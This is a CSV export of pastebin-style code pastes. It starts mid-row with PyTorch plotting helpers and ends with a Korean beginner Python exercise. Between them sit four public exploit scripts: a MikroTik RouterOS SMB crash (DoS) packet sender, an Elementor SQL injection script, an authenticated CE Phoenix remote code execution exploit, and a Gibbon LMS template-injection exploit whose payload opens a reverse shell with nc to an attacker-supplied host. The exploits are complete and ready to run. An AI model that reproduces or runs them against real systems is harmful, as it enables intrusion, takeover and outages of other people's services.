id,title,username,language,date,content
  """"""
  Function to save the trained model till current epoch, or whenver called
  """"""
  torch.save({
              'epoch': epoch+1,
              'model_state_dict': model.state_dict(),
              'optimizer_state_dict': optimizer.state_dict(),
              }, 'outputs/last_model.pth')

def save_loss_plot(
  OUT_DIR,
  train_loss_list,
  x_label='iterations',
  y_label='train loss',
    save_name='train_loss'
):
  """"""
  Function to save both train loss graph.

  :param OUT_DIR: Path to save the graphs.
  :param train_loss_list: List containing the training loss values.
  """"""
  figure_1 = plt.figure(figsize=(10, 7), num=1, clear=True)
  train_ax = figure_1.add_subplot()
  train_ax.plot(train_loss_list, color='tab:blue')
  train_ax.set_xlabel(x_label)
  train_ax.set_ylabel(y_label)
  figure_1.savefig(f""{OUT_DIR}/{save_name}.png"")
  print('SAVING PLOTS COMPLETE...')

def save_mAP(OUT_DIR, map_05, map):
  """"""
  Saves the mAP@0.5 and mAP@0.5:0.95 per epoch.
  :param OUT_DIR: Path to save the graphs.
  :param map_05: List containing mAP values at 0.5 IoU.
  :param map: List containing mAP values at 0.5:0.95 IoU.
  """"""
  figure = plt.figure(figsize=(10, 7), num=1, clear=True)
  ax = figure.add_subplot()
  ax.plot(
      map_05, color='tab:orange', linestyle='-',
      label='mAP@0.5'
  )
  ax.plot(
      map, color='tab:red', linestyle='-',
      label='mAP@0.5:0.95'
  )
  ax.set_xlabel('Epochs')
  ax.set_ylabel('mAP')
  ax.legend()
  figure.savefig(f""{OUT_DIR}/map.png"")"
ZWhSqvSV,RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10 - Denial of Service - CVE-2024-27686,FlyFar,Python,Sunday 7th of April 2024 11:50:16 PM CDT,"# Exploit Title: CVE-2024-27686: RouterOS-SMB-DOS
# Google Dork: N/A
# Date: 03/04/2024
# Exploit Author: ice-wzl, Solstice Cyber Solutions
# Vendor Homepage: https://mikrotik.com/
# Software Link: https://mikrotik.com/download/archive
# Version: RouterOS devices ranging from 6.40.5 - 6.44 and 6.48.1 - 6.49.10
# Tested on: RouterOS 6.40.5 - 6.44 and 6.48.1 - 6.49.10
# CVE : CVE-2024-27686
#!/usr/bin/python3 
# Founded by ice-wzl in conjunction with Solstice Cyber Solutions
import argparse
import sys
import socket 
# Define the packets

# the packet that causes crash 6.40.5 - 6.42.3
fuzzed_packet_6 = b'\x00\x00\x00n\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x03\x00\xf1\x1f\x08\x00\x00\x00\x00\x00\x00\xe1\xbe\x82\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00G\xe5\x07\xf5\x07\xec\x01u\xe4Q]\x9e\xea\xedn\xa9\t\x00\x00\x00H\x00&\x00\\\x00\\\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x007\x007\x00\\\x00p\x00u\x00b\x00'


packet_0 = b'\x00\x00\x00\xea\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xe8\xe4*\x99\xc9\xeb\xb6E\xa2A\xe9(\xee%\xe5\xdfp\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00_\xf7m\xf2h*\x8f\x8ae\x0f8+T=Na8_\x0b@C\x82\xe7\x87\xc3qZ\xd7\xcf0M\x87\x00\x00\x02\x00\n\x00\x00\x00\x00\x00\x04\x00\x02\x00\x01\x00\x04\x00\x03\x00\x00\x00\x00\x00\x00\x00\x08\x00\x08\x00\x00\x00\x00\x00\x03\x00\x02\x00\x01\x00\x00\x00\x05\x00\x1a\x00\x00\x00\x00\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005\x00.\x008\x004\x00'
packet_2_fuzzed = b'\x00\x00\x00\xa2\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00X\x00J\x00\x00\x00\x00\x00\x00\x00\x00\x00`H\x05\x06+\x06\x01\x05\x05\x02\xa0>0<\xa0\x0e21540373\xed\xba\xad211\x0c\x06\n+\x06\x01\x04\x01\x82294517887446830\x02\x02\n\xa2*\x04(NTLMSSP\x00\x01\x00\x00\x00\x15\x82\x08b\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x06\x01\x00\x00\x00\x00\x00\x0f'


def open_connection(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        return s
    except ConnectionRefusedError:
        print(f""[!] Connection Refused on: {ip} {port}"")
        sys.exit(2)

def send_payload_high(s):
    s.send(packet_0)
    s.send(packet_2_fuzzed)
    s.close()

def send_payload_low(s):
    s.send(fuzzed_packet_6)
    s.close()

def verify_input(user_inp):
    try:
        user_inp = int(user_inp)
        if user_inp > 2 or user_inp < 1:
            return 3
        else:
            return user_inp
    except ValueError:
        return 0

if __name__ == '__main__':

    parser = argparse.ArgumentParser(prog='SMB Crash',
        description='Crashes Mikrotik RouterOS SMB Service 6.40.5 - 6.49.10',
        epilog='Discovered by: ice-wzl')

    parser.add_argument(""-t"", ""--target"", action=""store"", dest=""target"")
    parser.add_argument(""-p"", ""--port"", action=""store"", dest=""port"")

    args = parser.parse_args()
    
    if not args.target or not args.port:
        print(f""[+] python3 {sys.argv[0]} --help"")
        sys.exit(1)

    print(""[+] What version is the target:\n\t[1] 6.40.5 - 6.44\n\t[2] 6.48.1 - 6.49.10\nEnter 1 or 2:"")
    version_choice = input(""--> "")

    if verify_input(version_choice) == 0:
        print(""Please enter a number..."")
        sys.exit(3)
    elif verify_input(version_choice) == 3:
        print(""Please enter a number between 1 and 2"")
        sys.exit(4)

    if verify_input(version_choice) == 1:
        if args.port:
            get_connect = open_connection(args.target, int(args.port))
            send_payload_low(get_connect)
            print(f""[+] Sent DOS to {args.target} on {args.port}"")
        else:
            get_connect = open_connection(args.target, 445)
            send_payload_low(get_connect)
            print(f""[+] Sent DOS to {args.target} on 445"")  
    
    if verify_input(version_choice) == 2:
        if args.port:
            get_connect = open_connection(args.target, int(args.port))
            send_payload_high(get_connect)
            print(f""[+] Sent DOS to {args.target} on {args.port}"")

        else:
            get_connect = open_connection(args.target, 445)
            send_payload_high(get_connect)
            print(f""[+] Sent DOS to {args.target} on 445"")
            "
WSKQjLLx,Elementor Website Builder < 3.12.2 - Admin+ SQLi,FlyFar,Python,Sunday 7th of April 2024 11:46:13 PM CDT,"#EXPLOIT Elementor Website Builder < 3.12.2 - Admin+ SQLi
#References
#CVE : CVE-2023-0329
#E1.Coders
 
#Open Burp Suite.
#In Burp Suite, go to the ""Proxy"" tab and set it to listen on a specific port, such as 8080.
#Open a new browser window or tab, and set your proxy settings to use Burp Suite on port 8080.
#Visit the vulnerable Elementor Website Builder site and navigate to the Tools > Replace URL page.
#On the Replace URL page, enter any random string as the ""New URL"" and the following malicious payload as the ""Old URL"":
 
#code : http://localhost:8080/?test'),meta_key='key4'where+meta_id=SLEEP(2);#
#Press ""Replace URL"" on the Replace URL page. Burp Suite should intercept the request.
#Forward the intercepted request to the server by right-clicking the request in Burp Suite and selecting ""Forward"".
#The server will execute the SQL command, which will cause it to hang for 2 seconds before responding. This is a clear indication of successful SQL injection.
#Note: Make sure you have permission to perform these tests and have set up Burp Suite correctly. This command may vary depending on the specific setup of your server and the website builder plugin.</s
# 
#References :  https://wpscan.com/vulnerability/a875836d-77f4-4306-b275-2b60efff1493/
 
 
 
 
#Exploit Python  :
#The provided SQLi attack vector can be achieved using the following Python code with the ""requests"" library:
 
#This script sends a POST request to the target URL with the SQLi payload as the ""data"" parameter. It then checks if the response contains the SQLi payload, indicating a successful SQL injection.
#Please make sure you have set up your Burp Suite environment correctly. Additionally, it is important to note that this script and attack have been TESTED and are correct
 
import requests
 
# Set the target URL and SQLi payload
url = ""http://localhost:8080/wp-admin/admin-ajax.php""
data = {
    ""action"": ""elementor_ajax_save_builder"",
    ""editor_post_id"": ""1"",
    ""post_id"": ""1"",
    ""data"": ""test'),meta_key='key4'where+meta_id=SLEEP(2);#""
}
 
# Send the request to the target URL
response = requests.post(url, data=data)
 
# Check if the response indicates a successful SQL injection
if ""meta_key='key4'where+meta_id=SLEEP(2);#"" in response.text:
    print(""SQL Injection successful!"")
else:
    print(""SQL Injection failed."")
            "
VzPm3dHi,CE Phoenix v1.0.8.20 - Remote Code Execution,FlyFar,Python,Sunday 7th of April 2024 11:45:23 PM CDT,"## Exploit Title: CE Phoenix v1.0.8.20 - Remote Code Execution (RCE) (Authenticated)
#### Date: 2023-11-25
#### Exploit Author: tmrswrr
#### Category: Webapps
#### Vendor Homepage: [CE Phoenix](https://phoenixcart.org/)
#### Version: v1.0.8.20
#### Tested on: [Softaculous Demo - CE Phoenix](https://www.softaculous.com/apps/ecommerce/CE_Phoenix)

## EXPLOIT :

import requests
from bs4 import BeautifulSoup
import sys
import urllib.parse
import random
from time import sleep

class colors:
    OKBLUE = '\033[94m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    CBLACK = '\33[30m'
    CRED = '\33[31m'
    CGREEN = '\33[32m'
    CYELLOW = '\33[33m'
    CBLUE = '\33[34m'
    CVIOLET = '\33[35m'
    CBEIGE = '\33[36m'
    CWHITE = '\33[37m'

 
def entry_banner():
    color_random = [colors.CBLUE, colors.CVIOLET, colors.CWHITE, colors.OKBLUE, colors.CGREEN, colors.WARNING,
                    colors.CRED, colors.CBEIGE]
    random.shuffle(color_random)

    banner = color_random[0] + """"""
     CE Phoenix v1.0.8.20 - Remote Code Execution \n
     Author: tmrswrr
    """"""
    for char in banner:
        print(char, end='')
        sys.stdout.flush()
        sleep(0.0045)

def get_formid_and_cookies(session, url):
    response = session.get(url, allow_redirects=True)
    if response.ok:
        soup = BeautifulSoup(response.text, 'html.parser')
        formid_input = soup.find('input', {'name': 'formid'})
        if formid_input:
            return formid_input['value'], session.cookies
    return None, None

def perform_exploit(session, url, username, password, command):
    print(""\n[+] Attempting to exploit the target..."")

   
    initial_url = url + ""/admin/define_language.php?lngdir=english&filename=english.php""
    formid, cookies = get_formid_and_cookies(session, initial_url)
    if not formid:
        print(""[-] Failed to retrieve initial formid."")
        return

    # Login
    print(""[+] Performing login..."")
    login_payload = {
        'formid': formid,
        'username': username,
        'password': password
    }
    login_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'cepcAdminID={cookies[""cepcAdminID""]}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
        'Referer': initial_url
    }
    login_url = url + ""/admin/login.php?action=process""
    login_response = session.post(login_url, data=login_payload, headers=login_headers, allow_redirects=True)

    if not login_response.ok:
        print(""[-] Login failed."")
        print(login_response.text)
        return

    print(""[+] Login successful."")


    new_formid, _ = get_formid_and_cookies(session, login_response.url)
    if not new_formid:
        print(""[-] Failed to retrieve new formid after login."")
        return

    # Exploit
    print(""[+] Executing the exploit..."")
    encoded_command = urllib.parse.quote_plus(command)
    exploit_payload = f""formid={new_formid}&file_contents=%3C%3Fphp+echo+system%28%27{encoded_command}%27%29%3B""
    exploit_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'cepcAdminID={cookies[""cepcAdminID""]}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
        'Referer': login_response.url
    }
    exploit_url = url + ""/admin/define_language.php?lngdir=english&filename=english.php&action=save""
    exploit_response = session.post(exploit_url, data=exploit_payload, headers=exploit_headers, allow_redirects=True)

    if exploit_response.ok:
        print(""[+] Exploit executed successfully."")
    else:
        print(""[-] Exploit failed."")
        print(exploit_response.text)

    
    final_response = session.get(url)
    print(""\n[+] Executed Command Output:\n"")
    print(final_response.text)  

def main(base_url, username, password, command):
    print(""\n[+] Starting the exploitation process..."")
    session = requests.Session()
    perform_exploit(session, base_url, username, password, command)

if __name__ == ""__main__"":
    entry_banner()

    if len(sys.argv) < 5:
        print(""Usage: python script.py [URL] [username] [password] [command]"")
        sys.exit(1)

    base_url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    command = sys.argv[4]

    main(base_url, username, password, command)
            "
fBhCuP33,Gibbon LMS v26.0.00 - SSTI vulnerability - CVE-2024-24724,FlyFar,Python,Sunday 7th of April 2024 11:41:33 PM CDT,"# Exploit Title: Gibbon LMS v26.0.00 - SSTI vulnerability
# Date: 21.01.2024
# Exploit Author: SecondX.io Research Team(Islam Rzayev,Fikrat Guliev, Ali Maharramli)
# Vendor Homepage: https://gibbonedu.org/
# Software Link: https://github.com/GibbonEdu/core
# Version: v26.0.00
# Tested on: Ubuntu 22.0
# CVE : CVE-2024-24724

import requests
import re
import sys


def login(target_host, target_port,email,password):
     url = f'http://{target_host}:{target_port}/login.php?timeout=true'
     headers = {""Content-Type"": ""multipart/form-data; 
boundary=---------------------------174475955731268836341556039466""}
     data = 
f""-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""address\""\r\n\r\n\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""method\""\r\n\r\ndefault\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""username\""\r\n\r\n{email}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""password\""\r\n\r\n{password}\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""gibbonSchoolYearID\""\r\n\r\n025\r\n-----------------------------174475955731268836341556039466\r\nContent-Disposition: 
form-data; 
name=\""gibboni18nID\""\r\n\r\n0002\r\n-----------------------------174475955731268836341556039466--\r\n""
     r = requests.post(url, headers=headers, data=data, 
allow_redirects=False)
     Session_Cookie = re.split(r""\s+"", r.headers['Set-Cookie'])
     if Session_Cookie[4] is not None and '/index.php' in 
str(r.headers['Location']):
         print(""login successful!"")

     return Session_Cookie[4]



def rce(cookie, target_host, target_port, attacker_ip, attacker_port):
     url = 
f'http://{target_host}:{target_port}/modules/School%20Admin/messengerSettingsProcess.php'
     headers = {""Content-Type"": ""multipart/form-data; 
boundary=---------------------------67142646631840027692410521651"", 
""Cookie"": cookie}
     data = 
f""-----------------------------67142646631840027692410521651\r\nContent-Disposition: 
form-data; name=\""address\""\r\n\r\n/modules/School 
Admin/messengerSettings.php\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: 
form-data; 
name=\""enableHomeScreenWidget\""\r\n\r\nY\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: 
form-data; name=\""signatureTemplate\""\r\n\r\n{{{{[\'rm /tmp/f;mkfifo 
/tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port} 
 >/tmp/f']|filter('system')}}}}\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""messageBcc\""\r\n\r\n\r\n-----------------------------67142646631840027692410521651\r\nContent-Disposition: form-data; name=\""pinnedMessagesOnHome\""\r\n\r\nN\r\n-----------------------------67142646631840027692410521651--\r\n""
     r = requests.post(url, headers=headers, data=data, 
allow_redirects=False)
     if 'success0' in str(r.headers['Location']):
         print(""Payload uploaded successfully!"")



def trigger(cookie, target_host, target_port):
     url = 
f'http://{target_host}:{target_port}/index.php?q=/modules/School%20Admin/messengerSettings.php&return=success0'
     headers = {""Cookie"": cookie}
     print(""RCE successful!"")
     r = requests.get(url, headers=headers, allow_redirects=False)


if __name__ == '__main__':
     if len(sys.argv) != 7:
         print(""Usage: script.py <target_host> <target_port> 
<attacker_ip> <attacker_port> <email> <password>"")
         sys.exit(1)
     cookie = login(sys.argv[1], sys.argv[2],sys.argv[5],sys.argv[6])
     rce(cookie, sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
     trigger(cookie, sys.argv[1], sys.argv[2])
            "
3CeHrfNj,0408 미션 1,NotoriousH2,Python,Sunday 7th of April 2024 10:29:17 PM CDT,"from smart_home import Contact, example_heater, example_phone

# Problem 1
# 현재 온도와 설정 온도를 비교해, 현재 온도가 더 낮을 경우 히터를 켜고, 아니라면 히터를 끕니다.
def control_heater(heater):
    # 현재 온도를 읽어 옵니다.
    current = heater.current_temperature
    # 사용자가 설정한 목표 온도를 읽어 옵니다.
    preferred = heater.preferred_temperature

    # 부등호 수정 
    if preferred > current:
        heater.turn_on()
    else:
        heater.turn_off()


# Problem 2
# 섭씨 온도를 화씨 온도로 변환합니다.
def celsius_to_fahrenheit(celsius):
    fahrenheit = (celsius * 1.8) + 32
    # 오타 수정
    return fahrenheit


# Problem 3
# 현재 온도 정보를 텍스트로 표시합니다.
# 텍스트에는 섭씨와 화씨 온도, 히터의 켜짐/꺼짐 여부가 포함됩니다.
def read_temperature(heater):
    # 현재 온도(섭씨) 정보를 불러옵니다.
    # 아래 None을 지우고 코드를 완성해 주세요.
    celsius = heater.current_temperature

    # 화씨로 변환합니다.
    # 아래 None을 지우고 코드를 완성해 주세요.
    fahrenheit = celsius_to_fahrenheit(celsius)

    # 히터의 켜짐 여부를 나타내는 텍스트를 결정합니다.
    if heater.is_turned_on:
        is_turned_on_text = ""켜져""
    else:
        is_turned_on_text = ""꺼져""
    # celsius와 fahrenheit는 문자열이 아니므로 수정
    return ""현재 온도는 섭씨 "" + str(celsius) + ""도, 화씨 "" + str(fahrenheit) + ""도입니다. 히터가 "" + is_turned_on_text + "" 있습니다.""


# Problem 4
# 단축번호를 이용해, 저장된 연락처의 quick_number 인덱스의 사람에게 전화를 겁니다.
# 전화를 건 뒤 사용자에게 보여줄 메시지를 리턴합니다.
# 해당 번호에 저장된 사람이 없을 경우 None을 리턴합니다.
def quick_dial(phone, quick_number):
    # 단축번호 목록에서 quick_number 인덱스의 연락처를 찾습니다.
    # quick_number가 9일 때 에러가 발생하므로, try except 구문 추가
    try:
        contact = phone.saved_contacts[quick_number]
    except:
        return None

    # 찾은 전화번호에 전화를 겁니다.
    phone.dial(contact.phone_number)

    # 사용자에게 알려주는 메시지를 리턴합니다.
    return f""{contact.name}님에게 전화를 걸고 있습니다.""


# Problem 5
# 새로운 사람을 단축번호에 등록합니다. 단축번호는 저장된 순서대로 자동 지정됩니다.
def save_contact(phone, name, phone_number):
    # 새로운 연락처를 생성합니다.
    contact = Contact(name, phone_number)
    # 단축번호 목록에 연락처를 추가합니다.
    phone.saved_contacts.append(contact)


def main():
    # 함수 검증을 합니다.
    # 필요에 따라 더 많은 테스트를 추가할 수 있습니다.

    # control_heater를 테스트합니다.
    example_heater.current_temperature = -1.0
    control_heater(example_heater)

    # assert : 조건을 테스트하고 참이면 그대로 하고, 거짓이면 에러를 발생시켜라
    assert example_heater.is_turned_on == True

    # celsius_to_fahrenheit를 테스트합니다.
    assert celsius_to_fahrenheit(100) == 212

    # read_temperature를 테스트합니다.
    assert (
        read_temperature(example_heater) == ""현재 온도는 섭씨 -1.0도, 화씨 30.2도입니다. 히터가 켜져 있습니다.""
    )

    # save_contact 및 quick_dial을 테스트합니다.
    save_contact(example_phone, ""엘리스 토끼"", ""01010101010"")
    save_contact(example_phone, ""체셔 고양이"", ""01056785678"")
    assert quick_dial(example_phone, 0) == ""엘리스 토끼님에게 전화를 걸고 있습니다.""
    assert quick_dial(example_phone, 1) == ""체셔 고양이님에게 전화를 걸고 있습니다.""
    assert quick_dial(example_phone, 9) == None


# 프로그램이 지금 막 시작했으면
# main()이라는 함수를 실행
if __name__ == ""__main__"":
    main()

# Class 예시
# Contant는 name과 phone_number를 입력으로 받음
X= Contact('HH','010')
print(X.name) # HH
print(X.phone_number) # 010

# example_heater = Heater()
# example_heater는 아래의 값들이 존재하는 상태
# is_turned_on = False, current_temperature = 0.0
# preferred_temperature = 0.0, turn_on(), turn_off() 
# ex) example_heater.current_temperature --> 0.0

# example_phone = Phone()

print(example_heater.is_turned_on) # 원래는 False

# smart_home의 Heater 클래스에는 아래 함수가 있습니다.
# def turn_on(self):
#     self.is_turned_on = True
example_heater.turn_on() 
print(example_heater.is_turned_on) # True로 바뀜
"
